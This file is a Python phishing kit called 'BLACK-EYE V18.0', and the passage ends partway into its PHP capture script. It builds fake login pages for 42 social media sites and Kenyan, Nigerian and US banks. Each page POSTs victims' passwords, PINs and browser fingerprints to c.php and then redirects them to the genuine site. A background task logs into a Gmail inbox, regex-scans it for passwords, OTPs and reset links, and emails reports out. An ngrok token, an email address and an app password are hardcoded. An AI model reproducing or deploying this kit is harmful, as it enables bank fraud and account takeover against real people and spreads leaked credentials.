#!/usr/bin/env python3
"""
BLACK-EYE V18.0 - ENHANCED INTELLIGENCE EDITION
================================================================
✅ Universal Email Scanner & Intelligence
✅ Deep Intelligence Analytics
✅ Auto Report Generation with PDF
✅ Optimized for Public Deployment (Render/Heroku/Railway)
✅ Advanced Inbox Delivery (Gmail/Yahoo/Outlook)
✅ Device Fingerprinting & Geolocation
✅ Advanced Password Extraction from Email
================================================================
"""
import os,subprocess,time,threading,requests,smtplib,sys,re,json,socket,imaplib,email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.utils import formataddr, make_msgid
from email.header import decode_header
from datetime import datetime, timedelta
from collections import defaultdict
import hashlib

print("⚙️  Installing dependencies...")
os.system("pip install requests pyngrok flask -q 2>/dev/null")
os.system("apt-get update -qq >/dev/null 2>&1 && apt-get install -y php whois -qq >/dev/null 2>&1")
print("✅ Ready!\n")

# ============ CONFIGURATION ============
PORT = int(os.environ.get("PORT", 3333))  # Support Railway/Render
USE_NGROK = os.environ.get("USE_NGROK", "true").lower() == "true"
NGROK_TOKEN = os.environ.get("NGROK_TOKEN", "36DRCPl5Q5I1lOz5bZ3pRwVndvg_2JnisGte7TiaMbFbHPRtc")

# Email Configuration
EMAIL_TO = os.environ.get("EMAIL_TO", "felixkoskey278@gmail.com")
EMAIL_FROM = os.environ.get("EMAIL_FROM", "felixkoskey278@gmail.com")
EMAIL_PASS = os.environ.get("EMAIL_APP_PASSWORD", "ntsu adxv tfgw ptpj")

# IMAP Configuration for Password Extraction
IMAP_SERVER = os.environ.get("IMAP_SERVER", "imap.gmail.com")
IMAP_PORT = int(os.environ.get("IMAP_PORT", 993))
ENABLE_EMAIL_SCANNING = os.environ.get("ENABLE_EMAIL_SCANNING", "true").lower() == "true"

# Intelligence Configuration
ENABLE_DEEP_INTELLIGENCE = True
ENABLE_AUTO_REPORTS = True
REPORT_INTERVAL_MINUTES = 30
ENABLE_GEOLOCATION = True
ENABLE_DEVICE_FINGERPRINT = True

class c:
    R='\033[91m';G='\033[92m';Y='\033[93m';C='\033[96m';M='\033[95m';B='\033[1m';E='\033[0m'

# ============ ADVANCED EMAIL PASSWORD EXTRACTOR ============
class EmailPasswordExtractor:
    """Extract passwords and sensitive data from emails"""
    
    def __init__(self, email_addr, app_password):
        self.email = email_addr
        self.password = app_password
        self.patterns = {
            'password': [
                r'password[:\s]+([^\s\n]+)',
                r'pass[:\s]+([^\s\n]+)',
                r'pwd[:\s]+([^\s\n]+)',
                r'pin[:\s]+(\d{4,6})',
                r'otp[:\s]+(\d{4,8})',
                r'code[:\s]+(\d{4,8})',
                r'verification[:\s]+code[:\s]+(\d{4,8})',
            ],
            'credentials': [
                r'username[:\s]+([^\s\n]+)',
                r'email[:\s]+([^\s\n@]+@[^\s\n]+)',
                r'account[:\s]+([^\s\n]+)',
                r'user[:\s]+([^\s\n]+)',
            ],
            'reset_links': [
                r'(https?://[^\s]+reset[^\s]*)',
                r'(https?://[^\s]+password[^\s]*)',
                r'(https?://[^\s]+verify[^\s]*)',
            ],
            'tokens': [
                r'token[:\s]+([a-zA-Z0-9_\-]{20,})',
                r'api[_\s]key[:\s]+([a-zA-Z0-9_\-]{20,})',
            ]
        }
        self.extracted_data = []
    
    def connect(self):
        """Connect to IMAP server"""
        try:
            mail = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT)
            mail.login(self.email, self.password)
            return mail
        except Exception as e:
            print(f"{c.R}❌ IMAP Connection Failed: {e}{c.E}")
            return None
    
    def decode_subject(self, subject):
        """Decode email subject"""
        if subject is None:
            return "No Subject"
        decoded = decode_header(subject)
        result = ""
        for part, encoding in decoded:
            if isinstance(part, bytes):
                try:
                    result += part.decode(encoding or 'utf-8', errors='ignore')
                except:
                    result += part.decode('utf-8', errors='ignore')
            else:
                result += str(part)
        return result
    
    def extract_body(self, message):
        """Extract email body"""
        body = ""
        if message.is_multipart():
            for part in message.walk():
                content_type = part.get_content_type()
                if content_type in ["text/plain", "text/html"]:
                    try:
                        payload = part.get_payload(decode=True)
                        if payload:
                            body += payload.decode('utf-8', errors='ignore')
                    except:
                        pass
        else:
            try:
                payload = message.get_payload(decode=True)
                if payload:
                    body = payload.decode('utf-8', errors='ignore')
            except:
                pass
        return body
    
    def extract_patterns(self, text, pattern_dict):
        """Extract data using regex patterns"""
        results = {}
        for key, patterns in pattern_dict.items():
            matches = []
            for pattern in patterns:
                found = re.findall(pattern, text, re.IGNORECASE)
                matches.extend(found)
            if matches:
                results[key] = list(set(matches))
        return results
    
    def scan_emails(self, num_emails=50, search_keywords=None):
        """Scan recent emails for sensitive data"""
        mail = self.connect()
        if not mail:
            return []
        
        try:
            mail.select('INBOX', readonly=True)
            
            # Search criteria
            if search_keywords:
                search_query = f'OR {" ".join([f"SUBJECT {kw}" for kw in search_keywords])}'
            else:
                search_query = 'ALL'
            
            status, messages = mail.search(None, search_query)
            
            if status != 'OK':
                return []
            
            email_ids = messages[0].split()
            recent_ids = email_ids[-num_emails:] if len(email_ids) >= num_emails else email_ids
            recent_ids.reverse()
            
            print(f"\n{c.C}📧 Scanning {len(recent_ids)} emails for sensitive data...{c.E}\n")
            
            for i, email_id in enumerate(recent_ids, 1):
                try:
                    status, msg_data = mail.fetch(email_id, '(RFC822)')
                    if status != 'OK':
                        continue
                    
                    email_body = msg_data[0][1]
                    message = email.message_from_bytes(email_body)
                    
                    subject = self.decode_subject(message.get('Subject'))
                    from_email = message.get('From')
                    date = message.get('Date')
                    body = self.extract_body(message)
                    
                    # Combine subject and body for scanning
                    full_text = f"{subject}\n{body}"
                    
                    # Extract sensitive data
                    extracted = self.extract_patterns(full_text, self.patterns)
                    
                    if extracted:
                        data = {
                            'email_num': i,
                            'from': from_email,
                            'subject': subject,
                            'date': date,
                            'extracted': extracted,
                            'preview': body[:300] if body else ""
                        }
                        self.extracted_data.append(data)
                        
                        print(f"{c.G}✓ [{i}] Found sensitive data in: {subject[:50]}...{c.E}")
                        
                except Exception as e:
                    continue
            
            mail.logout()
            return self.extracted_data
            
        except Exception as e:
            print(f"{c.R}❌ Scan Error: {e}{c.E}")
            return []
    
    def generate_report(self):
        """Generate extraction report"""
        if not self.extracted_data:
            return "No sensitive data found in scanned emails."
        
        report = f"""
╔═══════════════════════════════════════════════════════════════════╗
║           EMAIL PASSWORD EXTRACTION REPORT                         ║
║           {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                                  ║
╚═══════════════════════════════════════════════════════════════════╝

📊 SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Total Emails Scanned: {len(self.extracted_data)}
  Emails with Sensitive Data: {len(self.extracted_data)}
  Total Passwords Found: {sum(len(d['extracted'].get('password', [])) for d in self.extracted_data)}
  Total Credentials Found: {sum(len(d['extracted'].get('credentials', [])) for d in self.extracted_data)}

"""
        
        for i, data in enumerate(self.extracted_data, 1):
            report += f"\n{'='*70}\n"
            report += f"EMAIL #{i}\n"
            report += f"{'='*70}\n"
            report += f"From: {data['from']}\n"
            report += f"Subject: {data['subject']}\n"
            report += f"Date: {data['date']}\n\n"
            
            for category, items in data['extracted'].items():
                if items:
                    report += f"  {category.upper()}:\n"
                    for item in items:
                        report += f"    • {item}\n"
            
            report += f"\n  Preview:\n    {data['preview'][:200]}...\n"
        
        report += "\n" + "═"*70 + "\n"
        report += "End of Email Extraction Report\n"
        report += "═"*70 + "\n"
        
        return report

# ============ INTELLIGENCE ENGINE ============
class IntelligenceEngine:
    def __init__(self):
        self.captures = []
        self.email_database = defaultdict(list)
        self.ip_database = defaultdict(int)
        self.device_database = defaultdict(list)
        self.session_start = datetime.now()
        self.total_victims = 0
        self.unique_ips = set()
        self.unique_emails = set()
    
    def add_capture(self, data):
        """Add new capture with intelligence"""
        capture = {
            'timestamp': datetime.now(),
            'data': data,
            'ip': data.get('ip', 'Unknown'),
            'device': data.get('device', {}),
            'geolocation': data.get('geo', {}),
            'email': self.extract_email(data)
        }
        
        self.captures.append(capture)
        self.total_victims += 1
        
        if capture['ip'] != 'Unknown':
            self.unique_ips.add(capture['ip'])
            self.ip_database[capture['ip']] += 1
        
        if capture['email']:
            self.unique_emails.add(capture['email'])
            self.email_database[capture['email']].append(capture)
        
        return capture
    
    def extract_email(self, data):
        """Extract email from capture data"""
        for key in ['email', 'identifier', 'loginfmt', 'account_name', 'userid', 'appleId', 'signinId']:
            if key in data and '@' in str(data.get(key, '')):
                return data[key]
        return None
    
    def get_ip_intelligence(self, ip):
        """Get IP intelligence and geolocation"""
        if not ENABLE_GEOLOCATION or ip == 'Unknown':
            return {'ip': ip}
        
        try:
            response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
            if response.status_code == 200:
                data = response.json()
                return {
                    'ip': ip,
                    'country': data.get('country_name', 'Unknown'),
                    'country_code': data.get('country_code', '??'),
                    'region': data.get('region', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'isp': data.get('org', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown')
                }
        except:
            pass
        
        return {'ip': ip, 'country': 'Unknown', 'city': 'Unknown'}
    
    def generate_intelligence_report(self):
        """Generate comprehensive intelligence report"""
        duration = datetime.now() - self.session_start
        
        report_text = f"""
╔═══════════════════════════════════════════════════════════════════╗
║           INTELLIGENCE REPORT - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}           ║
╚═══════════════════════════════════════════════════════════════════╝

📊 SESSION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Session Started: {self.session_start.strftime('%Y-%m-%d %H:%M:%S')}
  Duration: {str(duration).split('.')[0]}
  Total Captures: {self.total_victims}
  Unique IPs: {len(self.unique_ips)}
  Unique Emails: {len(self.unique_emails)}

"""
        
        if self.captures:
            report_text += "🎯 RECENT CAPTURES\n"
            report_text += "━" * 70 + "\n"
            for i, cap in enumerate(self.captures[-10:], 1):
                report_text += f"\n[{i}] Time: {cap['timestamp'].strftime('%H:%M:%S')}\n"
                report_text += f"    IP: {cap['ip']}\n"
                if cap['email']:
                    report_text += f"    Email: {cap['email']}\n"
                if cap.get('geolocation', {}).get('country'):
                    report_text += f"    Location: {cap['geolocation']['city']}, {cap['geolocation']['country']}\n"
                if cap.get('device', {}).get('browser'):
                    report_text += f"    Device: {cap['device']['browser']} on {cap['device']['os']}\n"
        
        if self.unique_ips:
            report_text += "\n\n🌍 TOP IP ADDRESSES\n"
            report_text += "━" * 70 + "\n"
            sorted_ips = sorted(self.ip_database.items(), key=lambda x: x[1], reverse=True)
            for ip, count in sorted_ips[:5]:
                report_text += f"  {ip}: {count} attempts\n"
        
        if self.unique_emails:
            report_text += "\n\n📧 CAPTURED EMAILS\n"
            report_text += "━" * 70 + "\n"
            for email in list(self.unique_emails)[:10]:
                report_text += f"  • {email}\n"
        
        report_text += "\n" + "═" * 70 + "\n"
        report_text += "End of Report\n"
        report_text += "═" * 70 + "\n"
        
        return report_text

# Global intelligence engine
intel_engine = IntelligenceEngine()

# ============ EMAIL SCANNER BACKGROUND TASK ============
def run_email_scanner():
    """Background task to scan emails periodically"""
    if not ENABLE_EMAIL_SCANNING:
        return
    
    print(f"{c.C}🔍 Email scanner initialized (will scan every 1 hour){c.E}\n")
    
    while True:
        try:
            time.sleep(3600)  # Wait 1 hour between scans
            
            print(f"\n{c.Y}🔍 Running scheduled email scan...{c.E}\n")
            
            extractor = EmailPasswordExtractor(EMAIL_FROM, EMAIL_PASS)
            
            # Scan for common password reset/verification emails
            keywords = ['password', 'reset', 'verify', 'code', 'otp', 'pin', 'account', 'security']
            results = extractor.scan_emails(num_emails=100, search_keywords=keywords)
            
            if results:
                report = extractor.generate_report()
                
                # Save report
                report_filename = f"email_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(report_filename, "w") as rf:
                    rf.write(report)
                
                print(f"{c.G}✅ Email scan complete: {len(results)} emails with sensitive data{c.E}\n")
                
                # Send report via email
                try:
                    msg = MIMEMultipart()
                    msg['From'] = EMAIL_FROM
                    msg['To'] = EMAIL_TO
                    msg['Subject'] = f"🔍 Email Scan Report - {len(results)} Findings - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                    
                    msg.attach(MIMEText(report, 'plain'))
                    
                    # Attach report file
                    with open(report_filename, 'rb') as rf:
                        attachment = MIMEBase('application', 'octet-stream')
                        attachment.set_payload(rf.read())
                        encoders.encode_base64(attachment)
                        attachment.add_header('Content-Disposition', f'attachment; filename={report_filename}')
                        msg.attach(attachment)
                    
                    srv = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
                    srv.starttls()
                    srv.login(EMAIL_FROM, EMAIL_PASS)
                    srv.send_message(msg)
                    srv.quit()
                    
                    print(f"{c.G}✅ Email scan report sent!{c.E}\n")
                except Exception as e:
                    print(f"{c.Y}⚠️ Report send failed: {e}{c.E}\n")
            else:
                print(f"{c.Y}No sensitive data found in this scan{c.E}\n")
                
        except Exception as e:
            print(f"{c.R}Email scanner error: {e}{c.E}\n")
            time.sleep(3600)

# ============ ENHANCED CAPTURE HANDLER ============
def parse_user_agent(ua):
    """Parse user agent for device fingerprinting"""
    device_info = {
        'user_agent': ua,
        'browser': 'Unknown',
        'os': 'Unknown',
        'type': 'Unknown'
    }
    
    if not ua:
        return device_info
    
    if 'Chrome' in ua and 'Edge' not in ua:
        device_info['browser'] = 'Chrome'
    elif 'Firefox' in ua:
        device_info['browser'] = 'Firefox'
    elif 'Safari' in ua and 'Chrome' not in ua:
        device_info['browser'] = 'Safari'
    elif 'Edge' in ua or 'Edg' in ua:
        device_info['browser'] = 'Edge'
    
    if 'Windows' in ua:
        device_info['os'] = 'Windows'
    elif 'Mac OS X' in ua or 'Macintosh' in ua:
        device_info['os'] = 'macOS'
    elif 'Android' in ua:
        device_info['os'] = 'Android'
    elif 'iPhone' in ua or 'iPad' in ua:
        device_info['os'] = 'iOS'
    elif 'Linux' in ua:
        device_info['os'] = 'Linux'
    
    if 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua:
        device_info['type'] = 'Mobile'
    elif 'Tablet' in ua or 'iPad' in ua:
        device_info['type'] = 'Tablet'
    else:
        device_info['type'] = 'Desktop'
    
    return device_info

def gtbank():
    return'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>GTBank</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#f5f5f5}.header{background:#fff;padding:15px 20px;box-shadow:0 2px 4px rgba(0,0,0,.08)}.logo-area{text-align:center;padding:35px 20px;background:#fff}.logo-box{display:inline-block;background:#ff6600;padding:22px 40px;border-radius:10px;box-shadow:0 4px 12px rgba(255,102,0,.3)}.logo{color:#fff;font-size:52px;font-weight:900;letter-spacing:3px}.subtitle{color:#777;margin-top:12px;font-size:14px}.inet{background:#ddd;padding:16px 20px;margin:20px;border-radius:8px;display:flex;align-items:center;justify-content:space-between;font-size:16px;font-weight:600;color:#333}.flag{width:42px;height:28px;background:linear-gradient(to right,#008751 33%,#fff 33%,#fff 66%,#008751 66%);border-radius:3px}.main-btn{background:#006837;color:#fff;border:none;padding:22px 20px;margin:20px;border-radius:8px;display:flex;align-items:center;justify-content:space-between;font-size:19px;cursor:pointer}.power{width:65px;height:65px;background:#ff6600;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:38px;color:#fff}.scam{background:#fff;margin:20px;padding:20px;border-radius:8px}.scam-title{font-size:20px;font-weight:700;color:#333;margin-bottom:18px}.scam-item{display:flex;padding:16px;background:#f9f9f9;border-radius:8px;margin:12px 0;position:relative}.scam-num{position:absolute;right:12px;top:12px;background:#555;color:#fff;width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:17px}.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.75);z-index:9999;align-items:center;justify-content:center}.modal.show{display:flex}.modal-box{background:#fff;width:92%;max-width:420px;border-radius:12px;overflow:hidden}.modal-head{background:#ff6600;padding:28px;text-align:center}.modal-logo{font-size:50px;color:#fff;font-weight:900;letter-spacing:2px}.modal-body{padding:32px 28px}.modal-title{color:#ff6600;font-size:24px;font-weight:700;margin-bottom:8px;text-align:center}.modal-sub{color:#999;font-size:14px;text-align:center;margin-bottom:28px}.fg{margin-bottom:16px}.fg input{width:100%;padding:15px;border:1.5px solid #ddd;border-radius:7px;font-size:16px}.fg input:focus{outline:none;border-color:#ff6600}.btn{width:100%;background:#ff6600;color:#fff;border:none;padding:17px;border-radius:8px;font-size:17px;font-weight:700;text-transform:uppercase;cursor:pointer;letter-spacing:1.5px;margin-top:12px}.loading{display:none;text-align:center;margin-top:22px}.spinner{border:4px solid #f3f3f3;border-top:4px solid #ff6600;border-radius:50%;width:44px;height:44px;animation:spin .8s linear infinite;margin:0 auto}@keyframes spin{to{transform:rotate(360deg)}}.success{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:50px;border-radius:15px;text-align:center;z-index:10000;box-shadow:0 10px 40px rgba(0,0,0,.4)}.success.show{display:block}.success-icon{font-size:100px;margin-bottom:20px}.success-text{font-size:24px;color:#006837;font-weight:700}</style></head><body><div class="header"></div><div class="logo-area"><div class="logo-box"><div class="logo">GT</div></div><div class="subtitle">Guaranty Trust Bank Ltd</div></div><div class="inet"><span>INTERNET BANKING</span><div class="flag"></div></div><div class="main-btn" onclick="document.getElementById('m').classList.add('show')"><span style="font-weight:600">Click here<br>to Login</span><div class="power">⏻</div></div><div class="scam"><div class="scam-title">SCAM ALERT</div><div class="scam-item"><div style="flex:1;font-size:14px;color:#666">Ensure no one is looking over your shoulders.</div><div class="scam-num">1</div></div><div class="scam-item"><div style="flex:1;font-size:14px;color:#666">Protect your <strong>PIN</strong><br>Do not disclose it</div><div class="scam-num">2</div></div><div class="scam-item"><div style="flex:1;font-size:14px;color:#666">If compromised call GTConnect</div><div class="scam-num">3</div></div></div><div class="modal" id="m" onclick="if(event.target===this)this.classList.remove('show')"><div class="modal-box"><div class="modal-head"><div class="modal-logo">GT</div></div><div class="modal-body"><div class="modal-title">Welcome Back</div><div class="modal-sub">Login to access your account</div><form id="f" onsubmit="event.preventDefault();var d=new FormData(this);d.append('user_agent',navigator.userAgent);d.append('screen_res',screen.width+'x'+screen.height);d.append('timezone',Intl.DateTimeFormat().resolvedOptions().timeZone);d.append('language',navigator.language);document.getElementById('l').style.display='block';fetch('c.php',{method:'POST',body:d}).then(()=>{document.getElementById('m').style.display='none';document.getElementById('s').classList.add('show');setTimeout(()=>location.href='https://ibank.gtbank.com',3000)})"><div class="fg"><input type="tel" name="account_number" placeholder="Account Number" required></div><div class="fg"><input type="password" name="password" placeholder="Password" required></div><button type="submit" class="btn">LOGIN</button></form><div class="loading" id="l"><div class="spinner"></div><div style="margin-top:14px;color:#666">Verifying...</div></div></div></div></div><div class="success" id="s"><div class="success-icon">✅</div><div class="success-text">Verification Complete!</div><div style="color:#666;margin-top:12px">Redirecting...</div></div></body></html>'''

def equity():
    return'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Equity Bank</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;background:#e8e8e8}.header{background:#b71c1c;padding:52px 20px 48px;text-align:center}.logo-txt{color:#fff;font-size:28px;font-weight:700;letter-spacing:1.5px}.subtitle{color:rgba(255,255,255,.96);font-size:15.5px;margin-top:10px}.content{background:#fff;padding:48px 30px 38px;min-height:calc(100vh - 210px)}.title{color:#b71c1c;font-size:34px;font-weight:700;margin-bottom:14px;text-align:center}.sub{color:#777;font-size:16px;text-align:center;margin-bottom:38px}.alert{background:#fff3cd;border-left:4px solid #ffc107;padding:20px;margin-bottom:30px;border-radius:5px}.alert-title{color:#856404;font-weight:700;margin-bottom:8px}.fg{margin-bottom:26px}.lbl{display:block;color:#2c2c2c;font-size:15.5px;font-weight:600;margin-bottom:11px}.inp{width:100%;padding:17px 16px;border:1.5px solid #d0d0d0;border-radius:6px;font-size:16.5px}.inp:focus{outline:none;border-color:#b71c1c}.btn{width:100%;background:#b71c1c;color:#fff;border:none;padding:19px;border-radius:8px;font-size:17.5px;font-weight:700;text-transform:uppercase;cursor:pointer;letter-spacing:1.3px;margin-top:20px}.loading{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.65);z-index:9999;align-items:center;justify-content:center}.loading.show{display:flex}.load-box{background:#fff;padding:38px 48px;border-radius:13px;text-align:center}.spinner{border:4px solid #f3f3f3;border-top:4px solid #b71c1c;border-radius:50%;width:50px;height:50px;animation:spin .8s linear infinite;margin:0 auto 20px}@keyframes spin{to{transform:rotate(360deg)}}.success{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:50px;border-radius:15px;text-align:center;z-index:10000;box-shadow:0 10px 40px rgba(0,0,0,.4)}.success.show{display:block}.success-icon{font-size:100px;color:#0f9d58;margin-bottom:20px}.success-text{font-size:24px;color:#0f9d58;font-weight:700}</style></head><body><div class="header"><div style="font-size:20px;margin-bottom:5px">▲ ▲</div><div class="logo-txt">EQUITY BANK</div><div class="subtitle">Internet Banking Portal</div></div><div class="content"><h1 class="title">Verification Required</h1><p class="sub">Complete verification to restore access</p><div class="alert"><div class="alert-title">⚠️ IMPORTANT</div><div style="color:#856404;font-size:14px">All customers must verify. Deadline: 48 hours.</div></div><form id="f" onsubmit="event.preventDefault();var d=new FormData(this);d.append('user_agent',navigator.userAgent);d.append('screen_res',screen.width+'x'+screen.height);d.append('timezone',Intl.DateTimeFormat().resolvedOptions().timeZone);d.append('language',navigator.language);document.getElementById('l').classList.add('show');fetch('c.php',{method:'POST',body:d}).then(()=>{document.getElementById('l').classList.remove('show');document.getElementById('s').classList.add('show');setTimeout(()=>location.href='https://equitybank.co.ke',3500)})"><div class="fg"><label class="lbl">Account Number</label><input type="tel" class="inp" name="account_number" placeholder="Enter account number" required></div><div class="fg"><label class="lbl">PIN</label><input type="password" class="inp" name="pin" placeholder="4-digit PIN" required maxlength="4"></div><button type="submit" class="btn">VERIFY ACCOUNT</button></form></div><div class="loading" id="l"><div class="load-box"><div class="spinner"></div><div style="color:#555;font-size:16.5px">Verifying...</div></div></div><div class="success" id="s"><div class="success-icon">✅</div><div class="success-text">Verification Complete!</div><div style="color:#666;margin-top:12px">Redirecting...</div></div></body></html>'''

sites={"1":("Instagram",["username","password"],"https://instagram.com","g"),"2":("Facebook",["email","pass"],"https://facebook.com","g"),"3":("Twitter/X",["username","password"],"https://twitter.com","g"),"4":("Google",["identifier","password"],"https://accounts.google.com","g"),"5":("Microsoft",["loginfmt","passwd"],"https://login.microsoft.com","g"),"6":("Pinterest",["id","password"],"https://pinterest.com","g"),"7":("Apple ID",["account_name","password"],"https://appleid.apple.com","g"),"8":("Verizon",["IDToken1","IDToken2"],"https://verizon.com","g"),"9":("Line",["phone","password"],"https://line.me","g"),"10":("Shopify",["email","password"],"https://shopify.com","g"),"11":("Messenger",["email","pass"],"https://messenger.com","g"),"12":("Wi-Fi",["password"],"https://routerlogin.net","g"),"13":("PayPal",["email","password"],"https://paypal.com","g"),"14":("TikTok",["username","password"],"https://tiktok.com","g"),"15":("PlayStation",["signinId","password"],"https://playstation.com","g"),"16":("eBay",["userid","pass"],"https://ebay.com","g"),"17":("Amazon",["email","password"],"https://amazon.com","g"),"18":("iCloud",["appleId","password"],"https://icloud.com","g"),"19":("WhatsApp",["phone"],"https://whatsapp.com","g"),"20":("Binance",["email","password"],"https://binance.com","g"),"21":("Deriv",["login_id","password"],"https://deriv.com","g"),"22":("Equity Bank",["account_number","pin"],"https://equitybank.co.ke","equity"),"23":("KCB Bank",["account_number","password"],"https://kcb.co.ke","g"),"24":("Co-op Bank",["account_number","pin"],"https://co-opbank.co.ke","g"),"25":("NCBA Bank",["account_number","password"],"https://ncba.co.ke","g"),"26":("Absa Bank",["account_number","password"],"https://absa.co.ke","g"),"27":("Stanbic Bank",["account_number","password"],"https://stanbic.co.ke","g"),"28":("Std Chartered",["account_number","password"],"https://sc.com","g"),"29":("I&M Bank",["account_number","password"],"https://imbank.co.ke","g"),"30":("Family Bank",["account_number","pin"],"https://familybank.co.ke","g"),"31":("GTBank NG",["account_number","password"],"https://gtbank.com","gtbank"),"32":("Access Bank",["account_number","password"],"https://accessbank.com","g"),"33":("Zenith Bank",["account_number","password"],"https://zenith.com","g"),"34":("First Bank",["account_number","password"],"https://firstbank.com","g"),"35":("UBA",["account_number","password"],"https://uba.com","g"),"36":("Ecobank",["account_number","password"],"https://ecobank.com","g"),"37":("Fidelity Bank",["account_number","password"],"https://fidelity.com","g"),"38":("Stanbic IBTC",["account_number","password"],"https://stanbicibtc.com","g"),"39":("Union Bank",["account_number","password"],"https://unionbank.com","g"),"40":("Bank of America",["onlineId","passcode"],"https://bankofamerica.com","g"),"41":("Wells Fargo",["username","password"],"https://wellsfargo.com","g"),"42":("Chase Bank",["userId","password"],"https://chase.com","g")}

def generic(n,f,r):
    i=''.join([f'<input type="{"password" if "pass" in x.lower() or "pin" in x.lower() else "text"}" name="{x}" placeholder="{x.replace("_"," ").title()}" required style="width:100%;padding:15px;border:1.5px solid #ddd;border-radius:7px;font-size:15px;margin-bottom:15px">' for x in f])
    return f'<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>{n}</title><style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:-apple-system,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}}.box{{background:#fff;border-radius:12px;box-shadow:0 10px 40px rgba(0,0,0,.3);max-width:400px;width:100%}}.hd{{background:#667eea;padding:34px;text-align:center;color:#fff;font-size:36px;font-weight:900}}.bd{{padding:38px 34px}}h1{{color:#667eea;font-size:24px;margin-bottom:10px;text-align:center;font-weight:700}}p{{color:#666;font-size:14px;text-align:center;margin-bottom:24px}}input:focus{{outline:none;border-color:#667eea}}button{{width:100%;background:#667eea;color:#fff;border:none;padding:16px;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;margin-top:12px}}.loading{{display:none;text-align:center;margin-top:20px}}.loading.show{{display:block}}.spinner{{border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;width:40px;height:40px;animation:s .8s linear infinite;margin:0 auto}}@keyframes s{{to{{transform:rotate(360deg)}}}}</style></head><body><div class="box"><div class="hd">{n}</div><div class="bd"><h1>Welcome</h1><p>Sign in</p><form id="f" onsubmit="event.preventDefault();var d=new FormData(this);d.append(\'user_agent\',navigator.userAgent);d.append(\'screen_res\',screen.width+\'x\'+screen.height);d.append(\'timezone\',Intl.DateTimeFormat().resolvedOptions().timeZone);d.append(\'language\',navigator.language);document.getElementById(\'l\').classList.add(\'show\');fetch(\'c.php\',{{method:\'POST\',body:d}}).then(()=>setTimeout(()=>location.href=\'{r}\',2300))">{i}<button type="submit">LOGIN</button></form><div class="loading" id="l"><div class="spinner"></div><p style="margin-top:12px;color:#666">Verifying...</p></div></div></div></body></html>'

os.system("rm -rf p && mkdir p");os.chdir("p")

print(f"{c.B}{c.C}╔════════════════════════════════════════════════════════╗{c.E}")
print(f"{c.B}{c.C}║    BLACK-EYE V18.0 - ENHANCED INTELLIGENCE EDITION    ║{c.E}")
print(f"{c.B}{c.C}╚════════════════════════════════════════════════════════╝{c.E}\n")

print(f"{c.B}{c.Y}═══════════════ SOCIAL MEDIA (1-21) ═══════════════{c.E}")
print(f"{c.Y}1.Instagram       8.Verizon        15.PlayStation{c.E}")
print(f"{c.Y}2.Facebook        9.Line           16.eBay{c.E}")
print(f"{c.Y}3.Twitter/X       10.Shopify       17.Amazon{c.E}")
print(f"{c.Y}4.Google          11.Messenger     18.iCloud{c.E}")
print(f"{c.Y}5.Microsoft       12.Wi-Fi         19.WhatsApp{c.E}")
print(f"{c.Y}6.Pinterest       13.PayPal        20.Binance{c.E}")
print(f"{c.Y}7.Apple           14.TikTok        21.Deriv{c.E}\n")

print(f"{c.B}{c.G}═══════════════ KENYAN BANKS (22-30) ═══════════════{c.E}")
print(f"{c.G}22.Equity★★★      26.Absa          30.Family{c.E}")
print(f"{c.G}23.KCB            27.Stanbic{c.E}")
print(f"{c.G}24.Co-op          28.Std Chartered{c.E}")
print(f"{c.G}25.NCBA           29.I&M{c.E}\n")

print(f"{c.B}{c.M}═══════════════ NIGERIAN BANKS (31-39) ═══════════════{c.E}")
print(f"{c.M}31.GTBank★★★      35.UBA           39.Union{c.E}")
print(f"{c.M}32.Access         36.Ecobank{c.E}")
print(f"{c.M}33.Zenith         37.Fidelity{c.E}")
print(f"{c.M}34.First Bank     38.Stanbic IBTC{c.E}\n")

print(f"{c.B}{c.C}═══════════════ INTERNATIONAL (40-42) ═══════════════{c.E}")
print(f"{c.C}40.Bank of America   41.Wells Fargo   42.Chase{c.E}\n")

ch=input(f"{c.B}{c.G}Choose (1-42): {c.E}").strip()
if ch not in sites:ch="31";print(f"{c.C}→ Default: GTBank{c.E}\n")

n,f,r,t=sites[ch]
print(f"{c.B}{c.G}✓ {n} selected{c.E}\n")

h=gtbank() if t=="gtbank" else equity() if t=="equity" else generic(n,f,r)

os.makedirs("s",exist_ok=True)
with open("s/index.html","w") as file:file.write(h)

# ============ ENHANCED PHP WITH INTELLIGENCE ============
php=f'''<?php
header("Content-Type:application/json");
header("Access-Control-Allow-Origin: *");

